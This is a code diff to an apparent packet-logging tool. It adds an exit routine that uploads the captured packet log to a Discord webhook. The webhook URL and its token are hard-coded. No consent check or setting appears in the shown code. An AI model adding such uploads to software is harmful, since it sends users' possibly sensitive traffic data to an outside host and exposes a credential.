@@ -231,12 +231,39 @@ def cleanup_and_exit():
         except:
             pass
             
+    # Try to extract the log file before stopping the logger
+    log_filepath = None
+    try:
+        from core.packet_helpers import get_current_log_filepath
+        log_filepath = get_current_log_filepath()
+    except Exception:
+        pass
+
     try:
         from core.packet_helpers import stop_packet_log
         stop_packet_log()
     except:
         pass
         
+    # --- Discord Webhook Upload ---
+    webhook_url = "https://discord.com/api/webhooks/1520498468655730788/z6GwrwKJbCWSFPoDn2V1hlskBygnrX-E6Ijw1szMmckieJiriKqNb6R8nV0fJ5TWv4po"
+    if log_filepath and os.path.exists(log_filepath):
+        print(f"[*] Uploading log to Discord: {os.path.basename(log_filepath)}...")
+        try:
+            import requests
+            with open(log_filepath, "rb") as f:
+                response = requests.post(
+                    webhook_url,
+                    files={"file": (os.path.basename(log_filepath), f)}
+                )
+            if response.status_code in (200, 204):
+                print("[+] Successfully uploaded packet log to Discord.")
+            else:
+                print(f"[-] Discord upload failed with status: {response.status_code}")
+        except Exception as e:
+            print(f"[-] Discord upload error: {e}")
+
+    
     print("[!] Resources freed. Exiting program.")
     os._exit(0)
 
